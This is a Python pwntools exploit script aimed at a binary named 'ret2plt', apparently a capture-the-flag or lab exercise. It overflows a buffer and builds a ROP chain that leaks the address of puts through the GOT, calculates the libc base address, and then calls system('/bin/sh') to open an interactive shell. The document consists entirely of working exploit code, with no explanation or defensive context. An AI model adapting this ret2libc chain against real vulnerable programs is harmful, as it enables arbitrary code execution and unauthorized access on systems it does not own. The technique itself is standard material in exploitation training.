#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./ret2plt')
io = process()
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * 40
payload += pack(pop_rdi)
payload += pack(elf.got.puts)
payload += pack(elf.sym.puts)
payload += pack(elf.sym.main)

io.recvuntil(b'Enter Data - \n')
io.sendline(payload)

leak_line = io.recvline().strip()
leak = unpack(leak_line.ljust(8, b'\x00'))

libc.address = leak - libc.sym.puts
log.info(f'libc address: {hex(libc.address)}')

payload = b'A' * 40
payload += pack(pop_rdi)
payload += pack(next(libc.search(b'/bin/sh\x00')))
payload += pack(ret)
payload += pack(libc.sym.system)

io.sendline(payload)
io.interactive()

